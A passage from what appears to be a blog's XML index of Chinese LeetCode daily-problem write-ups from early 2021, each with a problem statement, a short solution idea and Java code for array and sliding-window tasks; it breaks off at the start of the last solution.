    <content type="text"><![CDATA[题目：485. 最大连续1的个数难度：简单 给定一个二进制数组， 计算其中最大连续1的个数。 示例 1: 123输入: [1,1,0,1,1,1]输出: 3解释: 开头的两位和最后的三位都是连续1，所以最大连续1的个数是 3. 注意： 输入的数组只包含 0 和1。 输入数组的长度是正整数，且不超过 10,000。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/max-consecutive-ones/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 快慢双指针，扫描 解题代码12345678910111213141516171819202122232425class Solution &#123; public int findMaxConsecutiveOnes(int[] nums) &#123; int ans = 0; int left = 0; int n = nums.length; while (left &lt; n) &#123; while (left &lt; n &amp;&amp; nums[left] == 0) &#123; left++; &#125; int right = left; while (right &lt; n &amp;&amp; nums[right] == 1) &#123; right++; &#125; ans = Math.max(ans,right - left); left = right; &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>双指针</tag>
        <tag>数组</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/2/13]]></title>
    <url>%2Fposts%2F50953371%2F</url>
    <content type="text"><![CDATA[题目：448. 找到所有数组中消失的数字难度：简单 给定一个范围在 1 ≤ a[i] ≤ n ( n = 数组大小 ) 的 整型数组，数组中的元素一些出现了两次，另一些只出现一次。 找到所有在 [1, n] 范围之间没有出现在数组中的数字。 您能在不使用额外空间且时间复杂度为O(n)的情况下完成这个任务吗? 你可以假定返回的数组不算在额外空间内。 示例: 12345输入:[4,3,2,7,8,2,3,1]输出:[5,6] 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/find-all-numbers-disappeared-in-an-array/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 原地映射，然后利用数组有含义的下标 解题代码123456789101112131415161718class Solution &#123; public List&lt;Integer&gt; findDisappearedNumbers(int[] nums) &#123; List&lt;Integer&gt; ans = new ArrayList&lt;&gt;(); int n = nums.length; for (int i : nums) &#123; int x = (i - 1) % n; nums[x] += n; &#125; for (int i = 0;i &lt; n;i++) &#123; if (nums[i] &lt;= n) &#123; ans.add(i + 1); &#125; &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数组</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/2/12]]></title>
    <url>%2Fposts%2F279203e7%2F</url>
    <content type="text"><![CDATA[题目：119. 杨辉三角 II难度：简单 给定一个非负索引 k，其中 k ≤ 33，返回杨辉三角的第 k 行。 在杨辉三角中，每个数是它左上方和右上方的数的和。 示例: 12输入: 3输出: [1,3,3,1] 进阶： 你可以优化你的算法到 O(k) 空间复杂度吗？ 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/pascals-triangle-ii/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 滚动数组 解题代码12345678910111213141516171819class Solution &#123; public List&lt;Integer&gt; getRow(int rowIndex) &#123; List&lt;Integer&gt; ans = new ArrayList&lt;&gt;(); for (int i = 0;i &lt;= rowIndex;i++) &#123; List&lt;Integer&gt; row = new ArrayList&lt;&gt;(); for (int j = 0;j &lt;= i;j++) &#123; if (j == 0 || j == i) &#123; row.add(1); &#125; else &#123; row.add(ans.get(j - 1) + ans.get(j)); &#125; &#125; ans = row; &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数组</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/2/11]]></title>
    <url>%2Fposts%2Fbe9b525d%2F</url>
    <content type="text"><![CDATA[题目：703. 数据流中的第 K 大元素难度：简单 设计一个找到数据流中第 k 大元素的类（class）。注意是排序后的第 k 大元素，不是第 k 个不同的元素。 请实现 KthLargest 类： KthLargest(int k, int[] nums) 使用整数 k 和整数流 nums 初始化对象。 int add(int val) 将 val 插入数据流 nums 后，返回当前数据流中第 k 大的元素。 示例： 12345678910111213输入：[&quot;KthLargest&quot;, &quot;add&quot;, &quot;add&quot;, &quot;add&quot;, &quot;add&quot;, &quot;add&quot;][[3, [4, 5, 8, 2]], [3], [5], [10], [9], [4]]输出：[null, 4, 5, 5, 8, 8]解释：KthLargest kthLargest = new KthLargest(3, [4, 5, 8, 2]);kthLargest.add(3); // return 4kthLargest.add(5); // return 5kthLargest.add(10); // return 5kthLargest.add(9); // return 8kthLargest.add(4); // return 8 提示： 1 &lt;= k &lt;= 104 0 &lt;= nums.length &lt;= 104 -104 &lt;= nums[i] &lt;= 104 -104 &lt;= val &lt;= 104 最多调用 add 方法 104 次 题目数据保证，在查找第 k 大元素时，数组中至少有 k 个元素 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/kth-largest-element-in-a-stream/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 维护一个最小堆 解题代码123456789101112131415161718192021222324252627class KthLargest &#123; PriorityQueue&lt;Integer&gt; q; int k; public KthLargest(int k, int[] nums) &#123; q = new PriorityQueue&lt;&gt;(); this.k = k; for (int i : nums) &#123; add(i); &#125; &#125; public int add(int val) &#123; if (q.size() &lt; k) &#123; q.offer(val); &#125; else if (q.peek() &lt; val) &#123; q.poll(); q.offer(val); &#125; return q.peek(); &#125;&#125;/** * Your KthLargest object will be instantiated and called as such: * KthLargest obj = new KthLargest(k, nums); * int param_1 = obj.add(val); */]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>堆</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/2/10]]></title>
    <url>%2Fposts%2Fc99c62cb%2F</url>
    <content type="text"><![CDATA[题目：567. 字符串的排列难度：中等 给定两个字符串 s1 和 s2 ，写一个函数来判断 s2 是否包含 *s1 * 的排列。 换句话说，第一个字符串的排列之一是第二个字符串的子串。 示例1: 123输入: s1 = &quot;ab&quot; s2 = &quot;eidbaooo&quot;输出: True解释: s2 包含 s1 的排列之一 (&quot;ba&quot;). 示例2: 12输入: s1= &quot;ab&quot; s2 = &quot;eidboaoo&quot;输出: False 注意： 输入的字符串只包含小写字母 两个字符串的长度都在 [1, 10,000] 之间 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/permutation-in-string/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 维护一个滑动窗口匹配排列即可 解题代码12345678910111213141516171819202122232425262728class Solution &#123; public boolean checkInclusion(String s1, String s2) &#123; int n = s1.length(); int m = s2.length(); if (n &gt; m) &#123; return false; &#125; int[] cnt1 = new int[26]; int[] cnt2 = new int[26]; for (int i = 0;i &lt; n;i++) &#123; cnt1[s1.charAt(i) - 'a']++; cnt2[s2.charAt(i) - 'a']++; &#125; if (Arrays.equals(cnt1,cnt2)) &#123; return true; &#125; for (int i = n;i &lt; m;i++) &#123; cnt2[s2.charAt(i - n) - 'a']--; cnt2[s2.charAt(i) - 'a']++; if (Arrays.equals(cnt1,cnt2)) &#123; return true; &#125; &#125; return false; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数组</tag>
        <tag>滑动窗口</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/2/9]]></title>
    <url>%2Fposts%2F91f3b557%2F</url>
    <content type="text"><![CDATA[题目：992. K 个不同整数的子数组难度：困难 给定一个正整数数组 A，如果 A 的某个子数组中不同整数的个数恰好为 K，则称 A 的这个连续、不一定独立的子数组为好子数组。 （例如，[1,2,3,1,2] 中有 3 个不同的整数：1，2，以及 3。） 返回 A 中好子数组的数目。 示例 1： 123输入：A = [1,2,1,2,3], K = 2输出：7解释：恰好由 2 个不同整数组成的子数组：[1,2], [2,1], [1,2], [2,3], [1,2,1], [2,1,2], [1,2,1,2]. 示例 2： 123输入：A = [1,2,1,3,4], K = 3输出：3解释：恰好由 3 个不同整数组成的子数组：[1,2,1,3], [2,1,3], [1,3,4]. 提示： 1 &lt;= A.length &lt;= 20000 1 &lt;= A[i] &lt;= A.length 1 &lt;= K &lt;= A.length 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/subarrays-with-k-different-integers/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 参考官方题解 滑动窗口盘他 解题代码12345678910111213141516171819202122232425262728293031class Solution &#123; public int subarraysWithKDistinct(int[] A, int K) &#123; return solove(A,K) - solove(A,K - 1); &#125; private int solove(int[] A,int K) &#123; int ans = 0; int left = 0; int right = 0; int cnt = 0; Map&lt;Integer, Integer&gt; window = new HashMap&lt;&gt;(); while (right &lt; A.length) &#123; window.put(A[right], window.getOrDefault(A[right], 0) + 1); if (window.get(A[right]) == 1) &#123; cnt++; &#125; right++; while (cnt &gt; K) &#123; window.put(A[left],window.get(A[left]) - 1); if (window.get(A[left]) == 0) &#123; cnt--; &#125; left++; &#125; ans += right - left + 1; &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数组</tag>
        <tag>滑动窗口</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/2/8]]></title>
    <url>%2Fposts%2Fe6f485c1%2F</url>
    <content type="text"><![CDATA[题目：978. 最长湍流子数组难度：中等 当 A 的子数组 A[i], A[i+1], …, A[j] 满足下列条件时，我们称其为湍流子数组： 若 i &lt;= k &lt; j，当 k 为奇数时， A[k] &gt; A[k+1]，且当 k 为偶数时，A[k] &lt; A[k+1]； *或 * 若 i &lt;= k &lt; j，当 k 为偶数时，A[k] &gt; A[k+1] ，且当 k 为奇数时， A[k] &lt; A[k+1]。 也就是说，如果比较符号在子数组中的每个相邻元素对之间翻转，则该子数组是湍流子数组。 返回 A 的最大湍流子数组的 长度 。 示例 1： 123输入：[9,4,2,10,7,8,8,1,9]输出：5解释：(A[1] &gt; A[2] &lt; A[3] &gt; A[4] &lt; A[5]) 示例 2： 12输入：[4,8,12,16]输出：2 示例 3： 12输入：[100]输出：1 提示： 1 &lt;= A.length &lt;= 40000 0 &lt;= A[i] &lt;= 10^9 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/longest-turbulent-subarray/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 按波峰或者波谷推进并维护滑动窗口 解题代码1234567891011121314151617181920212223242526class Solution &#123; public int maxTurbulenceSize(int[] arr) &#123; int left = 0; int right = 0; int n = arr.length; int ans = 1; while (right &lt; n - 1) &#123; if (left == right) &#123; if (arr[left] == arr[left + 1]) &#123; left++; &#125; right++; &#125; else &#123; if ((arr[right - 1] &lt; arr[right] &amp;&amp; arr[right] &gt; arr[right + 1]) || (arr[right - 1] &gt; arr[right] &amp;&amp; arr[right] &lt; arr[right + 1])) &#123; right++; &#125; else &#123; left = right; &#125; &#125; ans = Math.max(ans, right - left + 1); &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数组</tag>
        <tag>滑动窗口</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/2/7]]></title>
    <url>%2Fposts%2F764b9850%2F</url>
    <content type="text"><![CDATA[题目：665. 非递减数列难度：简单 给你一个长度为 n 的整数数组，请你判断在 最多 改变 1 个元素的情况下，该数组能否变成一个非递减数列。 我们是这样定义一个非递减数列的： 对于数组中所有的 i (0 &lt;= i &lt;= n-2)，总满足 nums[i] &lt;= nums[i + 1]。 示例 1: 123输入: nums = [4,2,3]输出: true解释: 你可以通过把第一个4变成1来使得它成为一个非递减数列。 示例 2: 123输入: nums = [4,2,1]输出: false解释: 你不能在只改变一个元素的情况下将其变为非递减数列。 说明： 1 &lt;= n &lt;= 10 ^ 4 -10 ^ 5 &lt;= nums[i] &lt;= 10 ^ 5 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/non-decreasing-array/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 统计非递减出现的次数，在每一个非递减的位置，尝试做出一次修改，这个修改有两种情况，可以修改前面的，也可以修改后面的 解题代码1234567891011121314151617181920212223242526272829303132333435363738class Solution &#123; public boolean checkPossibility(int[] nums) &#123; int cnt = 0; for (int i = 0;i + 1 &lt; nums.length;i++) &#123; int a = nums[i]; int b = nums[i + 1]; if (a &gt; b) &#123; cnt++; if (cnt &gt; 1) &#123; return false; &#125; // 尝试修改前面的 nums[i] = b; if (judge(nums)) &#123; return true; &#125; // 尝试修改后面的 nums[i] = a; nums[i + 1] = a; return judge(nums); &#125; &#125; return cnt &lt;= 1; &#125; private boolean judge(int[] nums) &#123; for (int i = 0;i + 1 &lt; nums.length;i++) &#123; if (nums[i] &gt; nums[i + 1]) &#123; return false; &#125; &#125; return true; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数组</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/2/6]]></title>
    <url>%2Fposts%2F14ca8c6%2F</url>
    <content type="text"><![CDATA[题目：1423. 可获得的最大点数难度：中等 几张卡牌 排成一行 ，每张卡牌都有一个对应的点数。点数由整数数组 cardPoints 给出。 每次行动，你可以从行的开头或者末尾拿一张卡牌，最终你必须正好拿 k 张卡牌。 你的点数就是你拿到手中的所有卡牌的点数之和。 给你一个整数数组 cardPoints 和整数 k，请你返回可以获得的最大点数。 示例 1： 123输入：cardPoints = [1,2,3,4,5,6,1], k = 3输出：12解释：第一次行动，不管拿哪张牌，你的点数总是 1 。但是，先拿最右边的卡牌将会最大化你的可获得点数。最优策略是拿右边的三张牌，最终点数为 1 + 6 + 5 = 12 。 示例 2： 123输入：cardPoints = [2,2,2], k = 2输出：4解释：无论你拿起哪两张卡牌，可获得的点数总是 4 。 示例 3： 123输入：cardPoints = [9,7,7,9,7,7,9], k = 7输出：55解释：你必须拿起所有卡牌，可以获得的点数为所有卡牌的点数之和。 示例 4： 123输入：cardPoints = [1,1000,1], k = 1输出：1解释：你无法拿到中间那张卡牌，所以可以获得的最大点数为 1 。 示例 5： 12输入：cardPoints = [1,79,80,1,1,1,200,1], k = 3输出：202 提示： 1 &lt;= cardPoints.length &lt;= 10^5 1 &lt;= cardPoints[i] &lt;= 10^4 1 &lt;= k &lt;= cardPoints.length 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/maximum-points-you-can-obtain-from-cards/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 递归，记忆化搜索，滑动窗口等多种思路 解题代码递归，超时 123456789101112131415161718192021222324class Solution &#123; public int maxScore(int[] cardPoints, int k) &#123; int ans = 0; int n = cardPoints.length; int left = 0; int right = n - 1; ans = dfs(cardPoints,left,right,k); return ans; &#125; private int dfs(int[] cardPoints,int left,int right,int k) &#123; if (k &lt;= 0) &#123; return 0; &#125; if (left &lt;= right) &#123; int lv = cardPoints[left] + dfs(cardPoints,left + 1,right,k - 1); int rv = cardPoints[right] + dfs(cardPoints,left,right - 1,k - 1); return Math.max(lv,rv); &#125; return 0; &#125;&#125; 记忆化搜索，内存超限 12345678910111213141516171819202122232425262728293031class Solution &#123; public int maxScore(int[] cardPoints, int k) &#123; int ans = 0; int n = cardPoints.length; int left = 0; int right = n - 1; ms = new int[n][n]; ans = dfs(cardPoints,left,right,k); return ans; &#125; int ms[][]; private int dfs(int[] cardPoints,int left,int right,int k) &#123; if (k &lt;= 0) &#123; return 0; &#125; if (left &lt;= right) &#123; if (ms[left][right] != 0) &#123; return ms[left][right]; &#125; int lv = cardPoints[left] + dfs(cardPoints,left + 1,right,k - 1); int rv = cardPoints[right] + dfs(cardPoints,left,right - 1,k - 1); ms[left][right] = Math.max(lv,rv); return ms[left][right]; &#125; return 0; &#125;&#125; 滑动窗口，AC 123456789101112131415161718192021222324class Solution &#123; public int maxScore(int[] cardPoints, int k) &#123; int n = cardPoints.length; int size = n - k; int sum = 0; int preSum = 0; for (int i = 0;i &lt; n;i++) &#123; sum += cardPoints[i]; if (i &lt; size) &#123; preSum += cardPoints[i]; &#125; &#125; int min = preSum; for (int i = 0;i + size &lt; n;i++) &#123; preSum -= cardPoints[i]; preSum += cardPoints[i + size]; min = Math.min(min,preSum); &#125; return sum - min; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数组</tag>
        <tag>滑动窗口</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/2/5]]></title>
    <url>%2Fposts%2F9845f97c%2F</url>
    <content type="text"><![CDATA[题目：1208. 尽可能使字符串相等难度：中等 给你两个长度相同的字符串，s 和 t。 将 s 中的第 i 个字符变到 t 中的第 i 个字符需要 |s[i] - t[i]| 的开销（开销可能为 0），也就是两个字符的 ASCII 码值的差的绝对值。 用于变更字符串的最大预算是 maxCost。在转化字符串时，总开销应当小于等于该预算，这也意味着字符串的转化可能是不完全的。 如果你可以将 s 的子字符串转化为它在 t 中对应的子字符串，则返回可以转化的最大长度。 如果 s 中没有子字符串可以转化成 t 中对应的子字符串，则返回 0。 示例 1： 123输入：s = &quot;abcd&quot;, t = &quot;bcdf&quot;, cost = 3输出：3解释：s 中的 &quot;abc&quot; 可以变为 &quot;bcd&quot;。开销为 3，所以最大长度为 3。 示例 2： 123输入：s = &quot;abcd&quot;, t = &quot;cdef&quot;, cost = 3输出：1解释：s 中的任一字符要想变成 t 中对应的字符，其开销都是 2。因此，最大长度为 1。 示例 3： 123输入：s = &quot;abcd&quot;, t = &quot;acde&quot;, cost = 0输出：1解释：你无法作出任何改动，所以最大长度为 1。 提示： 1 &lt;= s.length, t.length &lt;= 10^5 0 &lt;= maxCost &lt;= 10^6 s 和 t 都只含小写英文字母。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/get-equal-substrings-within-budget/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 朴素的滑动窗口会超时 需要优化 解题代码朴素的滑动窗口，超时 123456789101112131415161718192021222324class Solution &#123; public int equalSubstring(String s, String t, int maxCost) &#123; int n = s.length(); int ans = 0; int left = 0; int right = 0; int cost = 0; while (right &lt; n) &#123; int abs = Math.abs(s.charAt(right) - t.charAt(right)); if (cost + abs &lt;= maxCost) &#123; right++; cost += abs; &#125; else &#123; cost = 0; left++; right = left; &#125; ans = Math.max(right - left,ans); &#125; return ans; &#125;&#125; 优化后的滑动窗口，AC 123456789101112131415161718192021class Solution &#123; public int equalSubstring(String s, String t, int maxCost) &#123; int n = s.length(); int ans = 0; int left = 0; int right = 0; int cost = 0; while (right &lt; n) &#123; cost += Math.abs(s.charAt(right) - t.charAt(right)); while (cost &gt; maxCost) &#123; cost -= Math.abs(s.charAt(left) - t.charAt(left)); left++; &#125; ans = Math.max(right - left + 1,ans); right++; &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数组</tag>
        <tag>滑动窗口</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/2/4]]></title>
    <url>%2Fposts%2Fef42c9ea%2F</url>
    <content type="text"><![CDATA[题目：643. 子数组最大平均数 I难度：简单 给定 n 个整数，找出平均数最大且长度为 k 的连续子数组，并输出该最大平均数。 示例： 123输入：[1,12,-5,-6,50,3], k = 4输出：12.75解释：最大平均数 (12-5-6+50)/4 = 51/4 = 12.75 提示： 1 &lt;= k &lt;= n &lt;= 30,000。 所给数据范围 [-10,000，10,000]。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/maximum-average-subarray-i/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 维护一个滑动窗口 更新最大平均数 解题代码1234567891011121314151617class Solution &#123; public double findMaxAverage(int[] nums, int k) &#123; double sum = 0.0d; for (int i = 0;i &lt; k;i++) &#123; sum += nums[i]; &#125; double ans = sum / k; for (int i = 0;i + k &lt; nums.length;i++) &#123; sum -= nums[i]; sum += nums[i + k]; ans = Math.max(ans,sum / k); &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数组</tag>
        <tag>滑动窗口</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/2/3]]></title>
    <url>%2Fposts%2F71265c49%2F</url>
    <content type="text"><![CDATA[题目：480. 滑动窗口中位数难度：困难 中位数是有序序列最中间的那个数。如果序列的大小是偶数，则没有最中间的数；此时中位数是最中间的两个数的平均数。 例如： [2,3,4]，中位数是 3 [2,3]，中位数是 (2 + 3) / 2 = 2.5 给你一个数组 nums，有一个大小为 k 的窗口从最左端滑动到最右端。窗口中有 k 个数，每次窗口向右移动 1 位。你的任务是找出每次窗口移动后得到的新窗口中元素的中位数，并输出由它们组成的数组。 示例： 给出 nums = [1,3,-1,-3,5,3,6,7]，以及 k = 3。 12345678窗口位置 中位数--------------- -----[1 3 -1] -3 5 3 6 7 1 1 [3 -1 -3] 5 3 6 7 -1 1 3 [-1 -3 5] 3 6 7 -1 1 3 -1 [-3 5 3] 6 7 3 1 3 -1 -3 [5 3 6] 7 5 1 3 -1 -3 5 [3 6 7] 6 因此，返回该滑动窗口的中位数数组 [1,-1,-1,3,5,6]。 提示： 你可以假设 k 始终有效，即：k 始终小于输入的非空数组的元素个数。 与真实值误差在 10 ^ -5 以内的答案将被视作正确答案。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/sliding-window-median/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 利用二分查找 维护一个有序的滑动窗口 解题代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546class Solution &#123; public double[] medianSlidingWindow(int[] nums, int k) &#123; double[] ans = new double[nums.length - k + 1]; double[] windows = new double[k]; for (int i = 0;i &lt; windows.length;i++) &#123; windows[i] = nums[i]; &#125; Arrays.sort(windows); if (k % 2 == 0) &#123; ans[0] = (windows[k / 2 - 1] + windows[k / 2]) / 2; &#125; else &#123; ans[0] = windows[k / 2]; &#125; for (int i = 0;i + k &lt; nums.length;i++) &#123; int index = Arrays.binarySearch(windows,nums[i]); windows[index] = nums[i + k]; for (int j = index;j - 1 &gt;= 0;j--) &#123; if (windows[j - 1] &gt; windows[j]) &#123; swap(windows,j,j - 1); &#125; &#125; for (int j = index;j + 1 &lt; k;j++) &#123; if (windows[j] &gt; windows[j + 1]) &#123; swap(windows,j,j + 1); &#125; &#125; if (k % 2 == 0) &#123; ans[i + 1] = (windows[k / 2 - 1] + windows[k / 2]) / 2; &#125; else &#123; ans[i + 1] = windows[k / 2]; &#125; &#125; return ans; &#125; private void swap(double[] nums,int i,int j) &#123; double t = nums[i]; nums[i] = nums[j]; nums[j] = t; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数组</tag>
        <tag>二分查找</tag>
        <tag>滑动窗口</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/2/2]]></title>
    <url>%2Fposts%2F6216cdf%2F</url>
    <content type="text"><![CDATA[题目：424. 替换后的最长重复字符难度：中等 给你一个仅由大写英文字母组成的字符串，你可以将任意位置上的字符替换成另外的字符，总共可最多替换 k 次。在执行上述操作后，找到包含重复字母的最长子串的长度。 注意： 字符串长度 和 k 不会超过 104。 示例 1： 123输入：s = &quot;ABAB&quot;, k = 2输出：4解释：用两个&apos;A&apos;替换为两个&apos;B&apos;,反之亦然。 示例 2： 12345输入：s = &quot;AABABBA&quot;, k = 1输出：4解释：将中间的一个&apos;A&apos;替换为&apos;B&apos;,字符串变为 &quot;AABBBBA&quot;。子串 &quot;BBBB&quot; 有最长重复字母, 答案为 4。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/longest-repeating-character-replacement/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 参考大佬的题解 维护一个滑动窗口 解题代码1234567891011121314151617181920class Solution &#123; public int characterReplacement(String s, int k) &#123; int[] map = new int[26]; int left = 0; int right = 0; int maxn = 0; while (right &lt; s.length()) &#123; map[s.charAt(right) - 'A']++; maxn = Math.max(maxn,map[s.charAt(right) - 'A']); if (right - left + 1 - maxn &gt; k) &#123; map[s.charAt(left) - 'A']--; left++; &#125; right++; &#125; return right - left; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>双指针</tag>
        <tag>数组</tag>
        <tag>滑动窗口</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/2/1]]></title>
    <url>%2Fposts%2F9f283d65%2F</url>
    <content type="text"><![CDATA[题目：888. 公平的糖果棒交换难度：简单 爱丽丝和鲍勃有不同大小的糖果棒：A[i] 是爱丽丝拥有的第 i 根糖果棒的大小，B[j] 是鲍勃拥有的第 j 根糖果棒的大小。 因为他们是朋友，所以他们想交换一根糖果棒，这样交换后，他们都有相同的糖果总量。（一个人拥有的糖果总量是他们拥有的糖果棒大小的总和。） 返回一个整数数组 ans，其中 ans[0] 是爱丽丝必须交换的糖果棒的大小，ans[1] 是 Bob 必须交换的糖果棒的大小。 如果有多个答案，你可以返回其中任何一个。保证答案存在。 示例 1： 12输入：A = [1,1], B = [2,2]输出：[1,2] 示例 2： 12输入：A = [1,2], B = [2,3]输出：[1,2] 示例 3： 12输入：A = [2], B = [1,3]输出：[2,3] 示例 4： 12输入：A = [1,2,5], B = [2,4]输出：[5,4] 提示： 1 &lt;= A.length &lt;= 10000 1 &lt;= B.length &lt;= 10000 1 &lt;= A[i] &lt;= 100000 1 &lt;= B[i] &lt;= 100000 保证爱丽丝与鲍勃的糖果总量不同。 答案肯定存在。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/fair-candy-swap/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 记录两个数组的和的差值，然后搜索，使用容器提高查找效率 解题代码1234567891011121314151617181920212223242526class Solution &#123; public int[] fairCandySwap(int[] A, int[] B) &#123; int ans[] = new int[2]; int diff = 0; for (int i : A) &#123; diff += i; &#125; Set&lt;Integer&gt; hash = new HashSet&lt;&gt;(); for (int i : B) &#123; diff -= i; hash.add(i); &#125; for (int i : A) &#123; if (hash.contains(i - diff / 2)) &#123; ans[0] = i; ans[1] = i - diff / 2; return ans; &#125; &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数组</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/1/30]]></title>
    <url>%2Fposts%2Fe91fafa7%2F</url>
    <content type="text"><![CDATA[题目：778. 水位上升的泳池中游泳难度：困难 在一个 N x N 的坐标方格 grid 中，每一个方格的值 grid[i][j] 表示在位置 (i,j) 的平台高度。 现在开始下雨了。当时间为 t 时，此时雨水导致水池中任意位置的水位为 t 。你可以从一个平台游向四周相邻的任意一个平台，但是前提是此时水位必须同时淹没这两个平台。假定你可以瞬间移动无限距离，也就是默认在方格内部游动是不耗时的。当然，在你游泳的时候你必须待在坐标方格里面。 你从坐标方格的左上平台 (0，0) 出发。最少耗时多久你才能到达坐标方格的右下平台 (N-1, N-1)？ 示例 1: 1234567输入: [[0,2],[1,3]]输出: 3解释:时间为0时，你位于坐标方格的位置为 (0, 0)。此时你不能游向任意方向，因为四个相邻方向平台的高度都大于当前时间为 0 时的水位。等时间到达 3 时，你才可以游向平台 (1, 1). 因为此时的水位是 3，坐标方格中的平台没有比水位 3 更高的，所以你可以游向坐标方格中的任意位置 示例2: 1234567891011输入: [[0,1,2,3,4],[24,23,22,21,5],[12,13,14,15,16],[11,17,18,19,20],[10,9,8,7,6]]输出: 16解释: 0 1 2 3 424 23 22 21 512 13 14 15 1611 17 18 19 2010 9 8 7 6最终的路线用加粗进行了标记。我们必须等到时间为 16，此时才能保证平台 (0, 0) 和 (4, 4) 是连通的 提示: 2 &lt;= N &lt;= 50. grid[i][j] 是 [0, …, N*N - 1] 的排列。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/swim-in-rising-water/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 跟昨天那个题几乎一模一样 解题代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970class Solution &#123; public int 